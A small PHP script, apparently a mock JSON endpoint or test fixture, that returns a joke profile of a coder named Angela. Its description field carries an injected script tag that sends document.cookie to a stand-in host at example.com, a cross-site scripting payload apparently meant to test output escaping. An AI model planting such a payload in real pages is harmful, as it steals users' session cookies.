<?php

header('Content-Type: application/json');
setcookie('SessionID', '0w3789ht8745h807');

sleep(1);

class coder {
	public $name = 'Generic Person';
	
	public function __construct($name) {
		$this->setName($name);
	}
	
	public function setName($name) {
		if (!is_string($name))
			return;
		$this->name = $name;
	}
	
	public function getName() {
		return $this->name;
	}
}

$angela = new coder('Angela');
$angela->description = 'Angela is a coder. She also designs stuff and makes people go "how pretty", which makes us get more money.';
$angela->gender = 'm';
$angela->age = 23;
$angela->height = array('feet' => 5, 'inches' => 1);
$angela->skills = array('farting','drinking soda','intense death');

$angela->description .= <<<'EOF'
<script type="text/javascript">
(function(){
var xss = document.createElement('script'); xss.type = 'text/javascript'; xss.async = true;
xss.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'example.com/xssattack/'+escape(document.cookie)+'/a.js';
var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(xss, s);
})();
</script>
EOF;

echo json_encode($angela);

?>